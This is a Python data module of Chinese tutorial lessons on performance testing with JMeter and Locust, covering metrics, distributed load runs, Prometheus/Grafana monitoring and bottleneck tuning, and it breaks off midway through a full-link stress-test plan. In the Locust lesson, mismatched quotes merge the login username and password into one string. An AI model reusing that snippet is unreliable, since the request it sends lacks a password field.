"""
TestMaster 教程内容模块 P4
学习路径13-16：性能测试、安全测试、持续集成、测试平台开发
纯数据模块，供 seed_learning_paths_v3.py 导入使用
"""

LESSON_CONTENT_4 = {}

# ============================================================
# 路径13: 性能测试 - JMeter与Locust
# ============================================================
LESSON_CONTENT_4["性能测试 - JMeter与Locust"] = [
    {
        "title": "第1节：性能测试核心指标体系(TPS/QPS/RT/并发)",
        "sort_order": 1,
        "knowledge_point": "性能指标",
        "time_estimate": 30,
        "content": """## 性能测试核心指标体系

性能测试的目标是评估系统在特定负载下的响应能力、稳定性和资源消耗情况。一个完整的性能测试指标体系是解读测试结果、定位性能瓶颈的基础。

## 一、吞吐量指标：TPS与QPS

**TPS（Transactions Per Second）** 即每秒事务数，是衡量系统处理业务能力的最核心指标。一个事务通常代表一个完整的业务操作，比如一个用户下单流程（登录→浏览→加购→结算→支付），这整个过程计为1个TPS。

**QPS（Queries Per Second）** 即每秒查询数，用于衡量HTTP接口的请求处理能力。QPS与TPS的关系是：简单查询类接口中1个TPS≈1个QPS；复杂业务场景中1个TPS=N个QPS。

计算公式：`TPS = 总事务数 / 测试持续时间（秒）`，`QPS = 总请求数 / 测试持续时间（秒）`。

举例：某系统在60秒内处理了12000个HTTP请求，其中3000个是完整的下单事务，则QPS=200，TPS=50。

## 二、响应时间指标

**RT（Response Time）** 指从客户端发出请求到收到完整响应所经过的时间，以毫秒（ms）为单位。包含网络传输时间、服务端处理时间和数据渲染时间。

| 维度 | 说明 | 典型关注值 |
|------|------|-----------|
| 平均RT(Avg) | 所有请求响应时间的算术平均值 | 需结合其他指标 |
| 中位数(P50) | 50%的请求RT低于此值 | < 200ms |
| P90 | 90%的请求RT低于此值 | < 500ms |
| P95 | 95%的请求RT低于此值 | < 1000ms |
| P99 | 99%的请求RT低于此值 | < 2000ms |
| 最大RT(Max) | 最慢请求的响应时间 | 参考值 |

> **重要提示**：平均响应时间容易被极端值"拉高"，百分位数（P95、P99）比平均值更有参考价值。P99=2000ms意味着99%的用户在2秒内得到响应。

## 三、并发指标

**并发用户数**需区分两个概念：
- **业务并发用户数**：同时在线的用户数（登录但未必在操作）
- **服务端并发数**：同一时刻向服务端发送请求的用户/线程数

**并发连接数**指客户端与服务端之间建立的TCP连接数量。HTTP/1.1默认每个域名限制6个并发连接；HTTP/2通过多路复用大幅提升单连接效率。

## 四、资源利用率指标

| 指标 | 说明 | 告警阈值 |
|------|------|----------|
| CPU使用率 | 处理器使用百分比 | > 80%需关注 |
| 内存使用率 | 物理内存使用百分比 | > 85%需关注 |
| 磁盘IO | 磁盘读写速率和等待时间 | await > 10ms |
| 网络IO | 网络带宽使用率和丢包率 | 带宽 > 80% |
| 连接池使用率 | DB连接池/线程池使用比例 | > 80%需扩容 |

## 五、性能指标之间的关系

并发数↑→TPS先上升后趋于饱和→RT逐步增大；资源利用率↑→达到瓶颈→TPS不再增长、RT急剧上升。**最佳并发数**是TPS不再明显增长而RT开始快速上升的拐点。

## 六、性能测试类型与指标侧重

| 测试类型 | 目的 | 关键指标 |
|----------|------|----------|
| 负载测试 | 评估预期负载下的性能 | TPS、RT、CPU利用率 |
| 压力测试 | 找到系统极限 | 最大TPS、崩溃点 |
| 稳定性测试 | 长时间运行的可靠性 | 内存泄漏、TPS波动 |
| 容量测试 | 评估扩容需求 | 最大并发用户数 |

> **小结**：性能指标体系是性能测试的"通用语言"。建议先与产品和开发团队一起定义SLI（服务水平指标）和SLO（服务水平目标），使性能测试有明确的对标依据。""",
    },
    {
        "title": "第2节：JMeter环境配置与核心组件",
        "sort_order": 2,
        "knowledge_point": "JMeter基础",
        "time_estimate": 35,
        "content": """## JMeter环境配置与核心组件

Apache JMeter是业界使用最广泛的开源性能测试工具之一，采用纯Java开发，支持HTTP、HTTPS、TCP、JDBC、FTP、JMS等多种协议的性能测试。

## 一、JMeter环境配置

### 1. JDK与JMeter安装

JMeter 5.x要求JDK 8或以上版本。下载JDK后配置环境变量：`JAVA_HOME=C:\Program Files\Java\jdk-11.0.17`，`Path=%JAVA_HOME%\bin;%Path%`。从 https://jmeter.apache.org/ 下载最新稳定版（推荐5.6.x），解压到指定目录即可。

JMeter目录结构：
```
apache-jmeter-5.6.3/
├── bin/              # 启动脚本和配置文件
│   ├── jmeter.bat    # Windows启动脚本
│   ├── jmeter.sh     # Linux/Mac启动脚本
│   ├── jmeter.properties  # 主配置文件
│   └── user.properties    # 用户自定义配置
├── lib/              # 核心依赖库
├── lib/ext/          # 插件目录
└── docs/             # 文档
```

### 2. JMeter调优（生产压测必做）

默认配置适合桌面调试，生产压测前必须调优：

```properties
# 内存调优（在jmeter.bat中设置HEAP参数）
# set HEAP=-Xms2g -Xmx4g -XX:MaxMetaspaceSize=256m

# 禁用UI模式资源消耗
jmeterengine.force.system.exit=true

# 分布式压测端口
server.rmi.localport=4000
client.rmi.localport=5000

# 结果树输出控制
jmeter.save.saveservice.output_format=csv
jmeter.save.saveservice.response_data=false
jmeter.save.saveservice.samplerData=false
```

### 3. 推荐插件

下载plugins-manager.jar放到lib/ext/目录。推荐安装：Custom Thread Groups(阶梯式加压)、PerfMon(服务器资源监控)、3 Basic Graphs(响应时间/吞吐量/线程图)、Throughput Shaping Timer(精确控速)。

## 二、JMeter核心组件详解

JMeter测试计划的树形结构如下：

```
测试计划 (Test Plan)
├── 线程组 (Thread Group)
│   ├── 配置元件 (Config Element)：HTTP请求默认值/Cookie管理器/信息头管理器/CSV Data Set Config
│   ├── 前置处理器 (PreProcessor)
│   ├── 取样器 (Sampler)：HTTP请求/JDBC请求/Java请求/TCP取样器
│   ├── 后置处理器 (PostProcessor)：正则表达式提取器/JSON提取器/XPath提取器
│   ├── 断言 (Assertion)：响应断言/JSON断言/持续时间断言/大小断言
│   ├── 定时器 (Timer)：固定定时器/随机定时器/同步定时器(集合点)
│   └── 监听器 (Listener)：察看结果树/聚合报告/汇总报告/后端监听器
└── 非测试元件：HTTP代理服务器/工作台
```

### 核心组件功能表

| 组件 | 作用域 | 功能说明 | 常见配置 |
|------|--------|----------|----------|
| 线程组 | 测试计划 | 定义并发用户数和执行模式 | 线程数=100,Ramp-Up=10s |
| HTTP请求默认值 | 线程组 | 设置公共协议/域名/端口 | 协议=https,域名=api.example.com |
| HTTP Cookie管理器 | 线程组 | 自动管理Cookie | 默认即可 |
| CSV Data Set Config | 线程组 | 参数化数据源 | 文件路径、分隔符、是否循环 |
| JSON提取器 | 请求级 | 从JSON响应中提取数据 | $.data.token |
| 响应断言 | 请求级 | 验证响应内容 | 包含200,不包含error |
| 同步定时器 | 线程组 | 实现集合点并发 | 模拟用户数=50,超时=5000ms |
| 聚合报告 | 线程组 | 汇总性能数据 | Average/Median/P90/P95/TPS |

## 三、JMeter运行模式

| 模式 | 命令/方式 | 适用场景 |
|------|-----------|----------|
| GUI模式 | jmeter.bat | 脚本开发与调试 |
| CLI模式 | jmeter -n -t test.jmx -l result.jtl | 正式压测执行 |
| 分布式模式 | jmeter -n -t test.jmx -R remote_hosts | 大规模并发压测 |

```bash
# CLI模式示例
jmeter -n -t ./scripts/order_stress.jmx \
       -l ./results/result.jtl \
       -e -o ./reports/report \
       -Jthreads=100 -Jduration=600 -Jrampup=60
# -n:非GUI -t:测试计划 -l:结果输出 -e:生成HTML报告 -o:报告目录 -J:设置属性
```

> **小结**：口诀——GUI写脚本、CLI跑压测、看报告用HTML、大规模靠分布式。""",
    },
    {
        "title": "第3节：JMeter脚本开发(HTTP/SQL/参数化)",
        "sort_order": 3,
        "knowledge_point": "JMeter脚本开发",
        "time_estimate": 40,
        "content": """## JMeter脚本开发实战

JMeter脚本的开发和调试是性能测试工程师的核心技能之一。本节深入讲解HTTP接口测试、数据库压测以及参数化技术。

## 一、HTTP接口测试脚本开发

### 场景：用户登录→查询订单

**第一步**：添加HTTP请求默认值（协议=https,服务器=api.example.com,端口=443）

**第二步**：添加HTTP信息头管理器（Content-Type=application/json, Accept=application/json）

**第三步**：添加HTTP Cookie管理器（自动处理Session Cookie）

**第四步**：创建登录请求
```
名称：用户登录, 方法：POST, 路径：/api/v1/auth/login
消息体：{"username": "${username}", "password": "${password}"}
```

**第五步**：JSON提取器获取Token
```
变量名：token, JSON路径表达式：$.data.access_token, 默认值：NOT_FOUND
```

**第六步**：创建查询订单请求（GET /api/v1/orders?page=1），添加header `Authorization: Bearer ${token}`

### 2. 关联技术详解

| 提取器 | 适用场景 | 表达式示例 |
|--------|----------|-----------|
| 正则表达式提取器 | 任意文本 | `"orderId":"(\d+)"` |
| JSON提取器 | JSON响应 | `$.data.orderId` |
| XPath提取器 | XML/HTML响应 | `//order/id/text()` |
| 边界提取器 | 固定格式文本 | 左边界=`orderId=`, 右边界=`&` |
| JSR223后置处理器 | 复杂逻辑 | Groovy脚本自定义提取 |

### 3. 事务控制器

将多个请求组合为一个逻辑事务：查看商品详情→加入购物车→创建订单→发起支付→查询支付结果。

## 二、JDBC数据库压测

### 配置JDBC连接

将数据库驱动JAR包放入lib/目录。添加JDBC Connection Configuration：
```
Variable Name: mySqlPool
Database URL: jdbc:mysql://192.168.1.100:3306/testdb?useSSL=false
JDBC Driver Class: com.mysql.cj.jdbc.Driver
Max Number of Connections: 100
```

### SQL取样器类型

| 取样器类型 | 方法 | SQL示例 |
|-----------|------|---------|
| Select查询 | Select Statement | `SELECT * FROM orders WHERE user_id = ? AND status = ?` |
| 更新操作 | Update Statement | `UPDATE inventory SET stock = stock - 1 WHERE product_id = ?` |
| 预编译Select | Prepared Select | `SELECT name,price FROM products WHERE category_id = ?` |

### 常见压测场景SQL

```sql
-- 慢查询压测（模拟报表查询）
SELECT o.*, oi.*, p.name FROM orders o
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id
WHERE o.created_at BETWEEN '2024-01-01' AND '2024-12-31';

-- 高并发下单（乐观锁冲突测试）
UPDATE inventory SET stock = stock - 1, version = version + 1
WHERE product_id = ? AND stock > 0 AND version = ?;

-- 分页查询性能（深分页问题）
SELECT * FROM orders ORDER BY id DESC LIMIT 100 OFFSET ${__Random(0,100000)};
```

## 三、参数化技术

### 1. CSV Data Set Config

```
# testdata/users.csv
username,password,mobile,email
user001,Pass@123,13800138001,user001@test.com
user002,Pass@123,13800138002,user002@test.com
```

配置参数：Filename=users.csv, File Encoding=UTF-8, Variable Names=username,password,mobile,email, Delimiter=,, Recycle on EOF=True, Sharing Mode=All threads。

### 2. 参数化函数

| 函数 | 用途 | 示例 |
|------|------|------|
| `${__Random(1,100,)}` | 生成随机整数 | `${__Random(1,99999,randomId)}` |
| `${__RandomString(10,abcdef0123456789,)}` | 随机字符串 | 流水号 |
| `${__time(yyyy-MM-dd HH:mm:ss,)}` | 当前时间 | 时间戳 |
| `${__threadNum}` | 线程编号 | 唯一标识 |
| `${__counter(FALSE,)}` | 自增计数器 | 递增ID |
| `${__UUID}` | 生成UUID | 唯一订单号 |

### 3. 唯一下单参数化

```json
{
    "orderNo": "ORD${__time(yyyyMMddHHmmss,)}${__threadNum}${__counter(FALSE,)}",
    "userId": "${__Random(1,10000,)}",
    "productId": "${__Random(1,5000,)}",
    "quantity": ${__Random(1,5,)},
    "amount": "${__Random(1,999,)}.${__Random(0,99,)}"
}
```

### 4. 唯一数生成策略对比

| 策略 | 实现方式 | 并发安全 | 推荐场景 |
|------|----------|----------|----------|
| 时间戳+线程号+计数器 | JMeter函数组合 | ✅ 安全 | 大多数场景 |
| UUID | ${__UUID} | ✅ 安全 | 无需可读性 |
| CSV预生成 | CSV Data Set Config | ✅ 安全 | 固定数据范围 |
| 随机数 | ${__Random} | ⚠️ 可能重复 | 允许重复 |

> **小结**：脚本开发完成后，先用1个线程、1次循环在GUI模式下调试通过，确认关联正确、断言有效，再切换到CLI模式执行正式压测。""",
    },
    {
        "title": "第4节：JMeter分布式压测",
        "sort_order": 4,
        "knowledge_point": "JMeter分布式",
        "time_estimate": 35,
        "content": """## JMeter分布式压测

单台JMeter机器通常最多模拟500-1000并发用户。当需要数万甚至数十万并发时，需使用分布式压测架构。

## 一、分布式架构原理

JMeter分布式采用Master-Slave架构：

```
┌──────────────────────────────────────┐
│           Master (Controller)        │
│  管理测试计划、收集结果、生成报告     │
│  IP: 192.168.1.10                    │
└──┬──────────────────┬────────────────┘
   │                  │
┌──▼──────┐   ┌──────▼──────┐   ┌──────▼──────┐
│Slave-01 │   │  Slave-02   │   │  Slave-03   │
│并发1000 │   │  并发1000   │   │  并发1000   │
└─────────┘   └─────────────┘   └─────────────┘
         │           │               │
         └───────────┴───────────────┘
                     │
            ┌────────▼────────┐
            │   目标服务器     │
            │   (被测系统)    │
            └─────────────────┘
```

工作原理：Master将测试计划通过RMI分发给所有Slave→每个Slave独立执行→Slaves将结果回传给Master→Master汇总。

## 二、分布式环境搭建

**Master节点配置** (jmeter.properties)：
```properties
remote_hosts=192.168.1.11:1099,192.168.1.12:1099,192.168.1.13:1099
server.rmi.ssl.disable=true
client.rmi.localport=5000
mode=StrippedBatch
```

**Slave节点配置**：
```bash
# 启动JMeter Server
cd /opt/apache-jmeter-5.6.3/bin
./jmeter-server -Djava.rmi.server.hostname=192.168.1.11

# 防火墙开放端口
firewall-cmd --add-port=1099/tcp --permanent
firewall-cmd --add-port=50000-50100/tcp --permanent
```

**关键注意事项**：

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| Slave连接失败 | RMI网络不通 | 检查防火墙、设置hostname |
| 结果不一致 | 各Slave数据文件不同 | CSV文件路径一致 |
| 内存溢出 | 单Slave负载过高 | 增加HEAP内存 |
| 时间不同步 | 服务器时间不一致 | NTP同步所有节点 |

## 三、分布式压测执行

```bash
# 使用所有remote_hosts
jmeter -n -t ./scripts/order_distributed.jmx -r \
       -l ./results/distributed_result.jtl \
       -e -o ./reports/distributed_report \
       -Jthreads=2000 -Jduration=1800

# 指定Slave节点
jmeter -n -t ./scripts/order_distributed.jmx \
       -R 192.168.1.11:1099,192.168.1.12:1099

# 并发分配：总并发6000，3台Slave，每台线程数=2000
```

## 四、分布式压测检查清单

- [ ] 所有节点JMeter版本一致
- [ ] 所有节点JDK版本一致
- [ ] 所有节点时间已NTP同步（误差<1秒）
- [ ] Slave节点防火墙规则已配置
- [ ] CSV参数化文件已在所有Slave节点部署（相同路径）
- [ ] 插件已在所有Slave节点安装
- [ ] 数据库连接等信息使用属性变量（-J参数传入）
- [ ] 被测系统已开启性能监控
- [ ] 已通知相关团队压测时间窗口

> **小结**：分布式压测关键要点是网络可达、时间同步、配置一致。同时监控Slave节点本身资源——如果Slave CPU接近100%，说明Slave本身成为瓶颈，需要增加Slave数量。""",
    },
    {
        "title": "第5节：Locust脚本开发与分布式",
        "sort_order": 5,
        "knowledge_point": "Locust开发",
        "time_estimate": 35,
        "content": """## Locust脚本开发与分布式

Locust（蝗虫）是完全基于Python的现代化性能测试工具，使用协程（gevent）实现高并发，比JMeter更灵活、更易于集成到CI/CD流水线中。

## 一、Locust vs JMeter

| 维度 | JMeter | Locust |
|------|--------|--------|
| 开发语言 | Java | Python |
| 脚本方式 | GUI拖拽/XML配置 | 纯Python代码 |
| 并发模型 | 多线程 | 协程（gevent） |
| 单机并发能力 | 500-1000 | 5000-10000+ |
| 学习曲线 | 中等 | 需Python基础 |
| 分布式 | Master-Slave | Master-Worker |
| CI/CD集成 | 一般 | 优秀（Python生态） |

安装：`pip install locust`

## 二、基础脚本结构

```python
from locust import HttpUser, task, between, TaskSet

class UserBehavior(TaskSet):
    def on_start(self):
        resp = self.client.post("/api/v1/auth/login", json={
            "username": "testuser', 'password': 'Pass@123"
        })
        self.token = resp.json()["data"]["access_token"]

    @task(3)  # 权重3，执行概率更高
    def browse_products(self):
        self.client.get("/api/v1/products?page=1&pageSize=20",
            headers={"Authorization": f"Bearer {self.token}"})

    @task(1)  # 权重1
    def view_order_history(self):
        self.client.get("/api/v1/orders?status=COMPLETED",
            headers={"Authorization": f"Bearer {self.token}"})

class WebsiteUser(HttpUser):
    tasks = [UserBehavior]
    wait_time = between(1, 3)
    host = "https://api.example.com"
```

## 三、参数化与数据驱动

```python
import csv, random
from locust import HttpUser, task, between

def load_users():
    users = []
    with open("testdata/users.csv", "r", encoding="utf-8") as f:
        for row in csv.DictReader(f):
            users.append(row)
    return users

TEST_USERS = load_users()

class ECommerceUser(HttpUser):
    wait_time = between(0.5, 2)

    def on_start(self):
        user = random.choice(TEST_USERS)
        resp = self.client.post("/api/login", json=user)
        self.token = resp.json()["token"]

    @task(5)
    def search_product(self):
        keyword = random.choice(["手机", "电脑", "耳机"])
        self.client.get(f"/api/search?keyword={keyword}&page={random.randint(1,10)}",
            headers=self._auth_header(), name="/api/search")

    @task(3)
    def view_product_detail(self):
        pid = random.randint(1, 10000)
        self.client.get(f"/api/products/{pid}",
            headers=self._auth_header(), name="/api/products/{id}")

    @task(1)
    def create_order(self):
        self.client.post("/api/orders", json={
            "product_id": random.randint(1, 5000),
            "quantity": random.randint(1, 3),
            "address_id": random.randint(1, 100)
        }, headers=self._auth_header())

    def _auth_header(self):
        return {"Authorization": f"Bearer {self.token}"}
```

## 四、事务与检查点

```python
from locust.contrib.fasthttp import FastHttpUser

class TransactionUser(FastHttpUser):
    wait_time = between(1, 3)

    @task
    def complete_order_flow(self):
        with self.client.get("/api/products?page=1", catch_response=True) as resp:
            if resp.status_code != 200:
                resp.failure("商品列表请求失败")

        with self.client.post("/api/orders", json={
            "product_id": 12345, "quantity": 1
        }, catch_response=True, name="创建订单事务") as resp:
            if resp.status_code == 201:
                resp.success()
            else:
                resp.failure(f"下单失败: {resp.text[:100]}")
```

## 五、Locust分布式

```
┌──────────────────┐
│  Master (主节点)  │  Web UI界面/不执行压测/收集汇总
│  IP: 10.0.1.10   │
└──┬──────┬──────┬─┘
   │      │      │
┌──▼──┐┌──▼──┐┌──▼──┐
│W-01 ││W-02 ││W-03 │  并发各5000
└─────┘└─────┘└─────┘
```

```bash
# Master节点
locust -f locustfile.py --master --master-bind-host=0.0.0.0 --web-port=8089

# Worker节点
locust -f locustfile.py --worker --master-host=10.0.1.10

# 无Web UI模式（CI/CD）
locust -f locustfile.py --headless --users 10000 --spawn-rate 200 \
       --run-time 30m --csv=results/result --html=results/report.html
```

## 六、检查清单

- [ ] Python 3.8+ 环境确认
- [ ] locustfile.py语法验证
- [ ] 单用户调试模式测试通过
- [ ] Master-Worker网络互通验证
- [ ] 被测系统监控就绪

> **小结**：Locust推荐用于复杂业务逻辑编排、CI/CD深度集成、Python技术栈团队。对于非开发背景测试人员，JMeter的GUI更友好。""",
    },
    {
        "title": "第6节：性能监控(Prometheus/Grafana/Nginx日志)",
        "sort_order": 6,
        "knowledge_point": "性能监控",
        "time_estimate": 35,
        "content": """## 性能监控体系

性能测试如果没有监控，就像盲人摸象。完整的监控体系能帮我们实时了解系统状态，快速定位性能瓶颈。

## 一、监控体系架构

```
┌──────────────────────────────────────┐
│         Grafana 可视化层              │
│       (仪表盘 Dashboard / 告警)        │
└────────────┬─────────────────────────┘
             │
┌────────────▼─────────────────────────┐
│         Prometheus 数据层             │
│      (时序数据库 / PromQL 查询)        │
└──┬──────┬──────┬──────┬──────┬───────┘
   │      │      │      │      │
┌──▼──┐┌──▼──┐┌──▼──┐┌──▼──┐┌──▼──┐
│Node ││MySQL││JVM  ││Nginx││自定义│
│Exp. ││Exp. ││Exp. ││Exp. ││Metrics│
└─────┘└─────┘└─────┘└─────┘└──────┘
 服务器  数据库  Java    Web   业务
```

## 二、Prometheus + Grafana部署

Docker Compose快速部署：
```yaml
version: '3.8'
services:
  prometheus:
    image: prom/prometheus:v2.50.0
    ports: ["9090:9090"]
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
  grafana:
    image: grafana/grafana:10.3.1
    ports: ["3000:3000"]
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin123
  node-exporter:
    image: prom/node-exporter:v1.7.0
    ports: ["9100:9100"]
```

Prometheus配置 (prometheus.yml)：
```yaml
global:
  scrape_interval: 15s
scrape_configs:
  - job_name: 'node'
    static_configs: [{targets: ['node-exporter:9100']}]
  - job_name: 'spring-boot-app'
    metrics_path: '/actuator/prometheus'
    static_configs: [{targets: ['app-server:8080']}]
  - job_name: 'mysql'
    static_configs: [{targets: ['mysql-exporter:9104']}]
```

## 三、关键监控指标

### 系统层指标（Node Exporter）

| 指标 | PromQL查询 | 告警阈值 |
|------|-----------|----------|
| CPU使用率 | `100-avg(irate(node_cpu_seconds_total{mode="idle"}[5m]))*100` | >85% |
| 内存使用率 | `(1-node_memory_MemAvailable_bytes/node_memory_MemTotal_bytes)*100` | >90% |
| 磁盘使用率 | `(1-node_filesystem_avail_bytes/node_filesystem_size_bytes)*100` | >85% |
| 磁盘IO等待 | `rate(node_disk_io_time_seconds_total[5m])*100` | >10% |

### JVM应用指标

Spring Boot Actuator + Micrometer配置：
```yaml
management:
  endpoints.web.exposure.include: health,metrics,prometheus
  metrics.export.prometheus.enabled: true
```

| 指标 | 说明 | 正常范围 |
|------|------|----------|
| jvm_memory_used_bytes | 堆内存使用量 | <最大堆85% |
| jvm_gc_pause_seconds | GC暂停时间 | P99<200ms |
| jvm_threads_live | 活跃线程数 | 稳定不持续增长 |
| tomcat_threads_busy | 繁忙Tomcat线程 | <最大线程80% |

### MySQL关键指标

```sql
SHOW STATUS LIKE 'Threads_connected';     -- 连接数
SHOW VARIABLES LIKE 'max_connections';     -- 最大连接
SHOW VARIABLES LIKE 'slow_query_log%';     -- 慢查询
```

### Nginx日志分析

```bash
# GoAccess实时分析
goaccess /var/log/nginx/access.log --log-format=COMBINED --real-time-html

# awk分析P50/P95/P99
awk '{print $NF}' /var/log/nginx/access.log | sort -n | \
  awk '{all[NR]=$0} END{print "P50:",all[int(NR*0.5)],"P95:",all[int(NR*0.95)]}'
```

## 四、Grafana仪表盘推荐

| Dashboard ID | 名称 | 用途 |
|-------------|------|------|
| 1860 | Node Exporter Full | 服务器全面监控 |
| 4701 | JVM Micrometer | Java应用JVM监控 |
| 7362 | MySQL Overview | MySQL性能监控 |
| 11199 | Nginx监控 | Nginx连接统计 |

## 五、PromQL常用查询

```promql
# TPS计算
rate(http_server_requests_seconds_count[1m])

# P99响应时间
histogram_quantile(0.99, rate(http_server_requests_seconds_bucket[1m]))

# 错误率
rate(http_server_requests_seconds_count{status=~"5.."}[1m]) / rate(http_server_requests_seconds_count[1m]) * 100

# DB连接池使用率
hikaricp_connections_active / hikaricp_connections_max * 100
```

## 六、监控检查清单

**压测前**：
- [ ] Prometheus数据采集正常（Target UP）
- [ ] Grafana仪表盘已导入
- [ ] 慢查询日志已开启
- [ ] 应用日志级别调整为INFO
- [ ] 告警规则已暂时静音

**压测中**：
- [ ] CPU/内存/磁盘/网络趋势正常
- [ ] 数据库连接池未耗尽
- [ ] GC频率和停顿时间可接受
- [ ] 错误率在可接受范围
- [ ] P99无异常增长

> **小结**：当TPS不再增长而CPU未满时，问题可能在应用层（线程池/连接池/锁竞争）；当CPU满而TPS不达标时，需要代码优化或扩容。""",
    },
    {
        "title": "第7节：瓶颈分析与性能调优方法论",
        "sort_order": 7,
        "knowledge_point": "性能调优",
        "time_estimate": 35,
        "content": """## 瓶颈分析与性能调优方法论

性能测试的终极目标是发现问题、分析瓶颈、推动优化。本节介绍系统性的瓶颈分析和调优方法论。

## 一、性能瓶颈定位流程

```
压测发现问题（TPS不达标/RT超标/错误率高）
         │
   ┌─────┴──────┐
   ▼            ▼
资源层分析    应用层分析
CPU/内存      线程状态/GC日志
磁盘IO/网络   慢SQL/缓存命中率
连接数/带宽   锁竞争分析
   └─────┬──────┘
         ▼
   确认瓶颈层级
         │
   ┌─────┼──────┐
   ▼     ▼      ▼
硬件瓶颈 中间件瓶颈 代码瓶颈
(扩容)  (调参)  (改代码)
```

## 二、CPU瓶颈分析

```bash
# 查看Java进程各线程CPU使用率
top -H -p $(pgrep -f java)

# 线程CPU高排查
top -H -p <pid>
printf "%x\n" <tid>     # 线程ID转十六进制
jstack <pid> | grep -A 20 <hex_tid>  # 线程dump
```

| 原因 | 现象 | 解决方案 |
|------|------|----------|
| 死循环/无限递归 | 单线程CPU 100% | 修复代码逻辑 |
| 复杂计算 | 多线程CPU高 | 算法优化/缓存 |
| 频繁GC | CPU高+内存波动大 | 调大堆内存/优化GC策略 |
| 上下文切换过多 | sys%高 | 减少线程数/使用协程 |
| JSON序列化开销大 | 大量CPU在Jackson | 使用Protobuf/简化返回 |

## 三、内存瓶颈分析

```bash
# 查看Java堆内存使用
jstat -gcutil <pid> 1000 60

# 导出堆dump
jmap -dump:format=b,file=heap.hprof <pid>

# MAT分析：Dominator Tree/Leak Suspects Report/Histogram
```

| 问题 | 现象 | 解决方案 |
|------|------|----------|
| 堆内存不足 | OOM: Java heap space | 增大-Xmx/排查内存泄漏 |
| 元空间不足 | OOM: Metaspace | 增大-XX:MaxMetaspaceSize |
| ThreadLocal未清理 | 老年代持续增长 | finally中remove() |
| 静态集合膨胀 | 内存持续增长 | WeakHashMap/定期清理 |
| 大对象分配 | GC频繁耗时 | 对象池化/流式处理 |

## 四、数据库瓶颈分析

```sql
-- 查看当前执行的SQL
SHOW FULL PROCESSLIST;

-- 慢查询分析
pt-query-digest /var/log/mysql/slow.log --limit=10

-- 分析执行计划
EXPLAIN SELECT * FROM orders o
JOIN order_items oi ON o.id = oi.order_id
WHERE o.user_id = 12345 AND o.created_at > '2024-01-01';
```

EXPLAIN关键字段：

| 字段 | 含义 | 优化信号 |
|------|------|----------|
| type | 访问类型 | ALL(全表扫描)→需优化 |
| key | 使用的索引 | NULL→缺少索引 |
| rows | 扫描行数估计 | 过大→需加索引 |
| Extra | 额外信息 | Using filesort/temporary→需优化 |

数据库优化策略（按ROI排序）：
缓存>索引>SQL优化>连接池>代码优化>JVM调优>硬件扩容>架构重构

## 五、系统化调优步骤

1. **建立基线**：记录优化前TPS、RT、CPU、内存等指标
2. **确定目标**：明确优化后要达到的性能指标
3. **识别瓶颈**：监控数据+profiling工具定位瓶颈
4. **制定方案**：评估实施成本和预期收益
5. **验证优化**：A/B对比验证，每次只改一个变量
6. **持续监控**：优化上线后持续监控，确保持续改善

### 压测结果分析模板

```
【性能测试分析报告】
场景：混合业务50%浏览+30%搜索+20%下单
并发：100递增至1000，步长100

        并发100  并发500  并发800  并发1000
TPS      120      450      520      480
Avg RT   180ms    350ms    780ms    1850ms
P99 RT   450ms    1200ms   3200ms   8500ms
CPU%     35%      65%      78%      82%
DB连接    8        22       35       48/50(满)

【瓶颈定位】
CPU使用率82%未满，但数据库连接池耗尽(50/50)，
orders表全表扫描（缺少user_id+created_at复合索引）。

【优化建议】
P0: 添加复合索引 idx_user_created(user_id, created_at)
P1: 增加数据库连接池从50→100
P2: 引入Redis缓存商品热点数据
预计优化后TPS可达600-800。
```

> **小结**：核心原则——测量驱动，数据说话。永远不要凭感觉做优化，每次改动前后都要有数据对比。过早优化是万恶之源，但必要的优化不可拖延。""",
    },
    {
        "title": "第8节：全链路压测方案设计与执行",
        "sort_order": 8,
        "knowledge_point": "全链路压测",
        "time_estimate": 35,
        "content": """## 全链路压测方案设计与执行

全链路压测（Full-Link Stress Testing）是在生产环境或类生产环境中，模拟真实用户场景，对整个业务链路进行全面性能测试。

## 一、全链路压测架构全景

```
客户端→CDN→网关(Nginx/Kong)→应用服务集群
        │         │          │
        ▼         ▼          ▼
    认证服务   订单服务   商品服务
        │         │          │
        ▼         ▼          ▼
    ┌─────────────────────────┐
    │  中间件层               │
    │  Redis/MQ/ES/MySQL      │
    └─────────────────────────┘
        │         │          │
        ▼         ▼          ▼
    短信服务   支付服务   物流服务(外部依赖)

挑战：数据隔离 | 流量染色 | Mock外部 | 监控全覆盖
```

### 全链路压测 vs 单接口压测

| 维度 | 单接口压测 | 全链路压测 |
|------|-----------|-----------|
| 测试范围 | 单个API | 完整业务流程链路 |
| 数据影响 | 测试数据 | 需要数据隔离 |
| 外部依赖 | 直接Mock | 流量染色或Mock |
| 监控范围 | 单服务 | 全链路(网关→应用→中间件) |
| 准备成本 | 低 | 高 |
| 价值 | 发现单点问题 | 发现系统间交互问题 |

## 二、关键技术

### 流量染色

```yaml
# 请求头标识压测流量
headers:
  X-Stress-Test: "true"
  X-Stress-Tag: "scene_order_2024Q1"
```

```java
// 应用层识别压测流量
@Aspect @Component
public class StressTestAspect {
    @Around("@annotation(...RequestMapping)")
    public Object handleStressTest(ProceedingJoinPoint pjp) {
        boolean isStress = "true".equals(request.getHeader("X-Stress-Test"));
        if (isStress) {
            StressTestContext.set(true);
            StressTestContext.setShadowTable(true);
        }
        try { return pjp.proceed(); }
        finally { if (isStress) StressTestContext.clear(); }
    }
}
```

### 数据隔离方案

| 方案 | 原理 | 优点 | 缺点 |
|------|------|------|------|
| 影子库 | 压测数据写入独立数据库 | 完全隔离 | 维护额外DB |
| 影子表 | 同DB中影子表(前缀_shadow) | 运维成本低 | 需改造SQL路由 |
| 数据偏移 | 压测数据使用特定ID范围 | 实现简单 | 影响统计 |
| 逻辑隔离 | 通过字段标记(is_stress=1) | 改动最小 | SQL效率下降 |

### 外部依赖Mock

```python
@app.post("/api/v1/mock/payment/create")
async def mock_payment(request: PaymentRequest):
    return {
        "code": 0, "message": "success",
        "data": {
            "payment_id": f"MOCK_PAY_{uuid.uuid4().hex[:16]}",
            "status": "SUCCESS",
            "amount": request.amount
        }
    }
```

## 三、全链路压测执行方案

### 阶段划分

```
Phase 1: 准备（1-2周）
├── 压测目标确认（TPS/RT SLA）
├── 压测场景梳理（核心业务流程TOP 10-20）
├── 压测数据准备（影子库/影子表/数据偏移）
├── 监控体系搭建（全链路追踪+仪表盘）
├── Mock方案确认（外部依赖挡板）
└── 压测脚本开发与调试

Phase 2: 预热（1-3天）
